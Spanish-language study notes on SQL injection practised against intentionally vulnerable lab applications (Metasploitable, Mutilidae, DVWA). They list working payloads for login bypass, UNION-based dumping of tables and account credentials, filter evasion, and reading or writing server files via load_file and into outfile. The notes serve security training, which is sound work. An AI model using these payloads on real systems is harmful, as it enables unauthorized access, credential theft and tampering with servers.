# Vulnerabilidades SQL
- Nos conectamos a la db de metasploitable

`mysql -u root -h 10.10.10.52`

- show databases;
- use owasp10;
- show tables;
- select * from accounts;

## SQL en POST
- Nos registramos con un usuario nuevo

Probamos '

SELECT * FROM accounts WHERE username='admin' AND password=''

- Nos logueamos poniendo pass+' --> 123456'

SELECT * FROM accounts WHERE username='admin' AND password='123456' and 1=1 #'

- pass --> '123456' and 1=1 #'
- pass --> '123456' and 1=2 #'

## Login admin
- user: admin
- pass: aaa' or 1=1#
- user: admin'#

### Aumentando seguridad
- Toggle Security Level 1
- user: admin'#

Sin caracteres peligrosos
- user: admin
- pass: admin

Usamos Burpsite para ver la peticion y cambiar el pass o user.

## Hardening
$conn->real_scape_string($username) .

## SQL en GET con bases de datos

### Descubriendo si tiene esta vulnerabilidad

Entramos en Mutilidae --> OWASP Top10 --> injection --> Extract Data --> User info

- Introducimos credenciales y nos responde con la info. Se ve la consulta en la dirección.

index.php?page=user-info.php&username=yintao&password=1234&user-info-php-submit-button=View+Account+Details

index.php?page=user-info.php&username=yintao' order by 1#&password=1234&user-info-php-submit-button=View+Account+Details

La # se representa como %23

index.php?page=user-info.php&username=yintao' order by 10000000%23&password=1234&user-info-php-submit-button=View+Account+Details

Si responde el error de que no tiene 100000 columnas es que es vulnerable. 

### Leyendo información de la base de datos

- Descubrimos el numero de columnas

index.php?page=user-info.php&username=yintao' order by 6%23&password=1234&user-info-php-submit-button=View+Account+Details

index.php?page=user-info.php&username=yintao' union select 1,2,3,4,5%23&password=1234&user-info-php-submit-button=View+Account+Details

Funciones de la base de datos:
1. database()
2. user()
3. version()

index.php?page=user-info.php&username=yintao' union select 1,database(),user(),version(),5%23&password=1234&user-info-php-submit-button=View+Account+Details

### Encontramos tablas

index.php?page=user-info.php&username=yintao' union select 1,table_name,null,null,5 from information_schema.tables%23&password=1234&user-info-php-submit-button=View+Account+Details

index.php?page=user-info.php&username=yintao' union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'%23&password=1234&user-info-php-submit-button=View+Account+Details

index.php?page=user-info.php&username=yintao' union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'accounts'%23&password=1234&user-info-php-submit-button=View+Account+Details

index.php?page=user-info.php&username=yintao' union select 1,username,password,is_admin,5 from accounts%23&password=1234&user-info-php-submit-button=View+Account+Details

## Vulnerabilidades de injection SQL

// Ejemplos de declaraciones VERDADERAS para descubrir SQLi
- aNd 1=1
- aNd 21=21
- orDeR bY 1

// Ejemplos de declaraciones FALSAS
- dNd 0=1
- anD 9=2
- ordEr bY 1000000000000

// Caracteres a usar en lugar de espacios:
+, /**/, %20
// Ejemplos, orDeR bY 1 se puede volver a escribir como:
- orDer+bY+1
- `orDer/**/bY/**/1`
- orDer%20bY%201

// Comentarios para finalizar las consultas:
- /*
- //
- `#`
- %23

// PD: A veces es posible que necesites agregar ';' antes del comentario, ejemplos:
- anD 1=1//
- anD 1=1;//

### Consultas SQLi

// Sintaxis general de SELECT:
- UniOn selEct [número de columnas] [comentario]

// Ejemplos: Supondremos que hay 2 columnas y la columna 2 se puede usar para mostrar datos en la pantalla.

// Seleccionar la versión de la base de datos:
- UniOn selEct 1,version() /*

// Base de datos que se está usando:
- UniOn selEct 1,database() /*

// Usuario de la base de datos:
- UniOn selEct 1,user() /*

// Tablas de la base de datos:
- UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[nombre de la base de datos]' /*

// Columnas de tabla:
- UniOn selEct 1,column_name frOm information_schema.columns table_name = '[nombre de la tabla]' /*

// Seleccionar datos de la tabla:
- UniOn selEct 1,[nombre de la columna] frOm [nombre de la tabla] /*

// Leer archivos:
- UniOn selEct 1,load_file('ubicación del archivo') /*

// Escribir archivos:
- UniOn selEct null,[contenido del archivo] inTo outfile '/ubicacion/donde/escribir/el/archivo' /*

# SQL injection

- DWVA -->  security low 

Probamos:
1. SQL injection --> '
2. SQL injection (Blind) --> '

- 1' and 1=1#  --> # = %23 --> 1' and 1=1%23 --> True
- 1' and 1=2%23 --> False
- 1' order by 1%23
- 1' order by 10000%23 

Comprobamos el numero de columnas de la tabla probando 
- 1' order by 1%23
- 1' union select database(),2%23 --> descubrimos el nombre de la tabla --> dvwa

## Security Level Medium
- Hay filtro para las '
- 1 order by 1%23
- 1 union select database(),2%23
- 1 union select table_name,2 from information_schema.tables%23

- 1 union select table_name,2 from information_schema.tables where table_schema='dvwa'%23
- 1 union select table_name,2 from information_schema.tables where table_schema=%27dvwa%27%23
- 1 union select table_name,2 from information_schema.tables where table_schema='dvwa'%23

Abrimos Burpsite --> Decoder --> Encode as URL 

Encode as hex --> hex

- 1 union select table_name,2 from information_schema.tables where table_schema=0x64767761%23

## Eludir Filtros
- and 1=1
- aNd 222=222
- aND 111=111
- orDeR by 1
- Space --> /**/     + 
- union select 1,2
- uNioN+sElect+1,2

- 1'+uNioN/**/sElect/**/table_name,2+fRom+information_schema.tables+limit+0,1%23

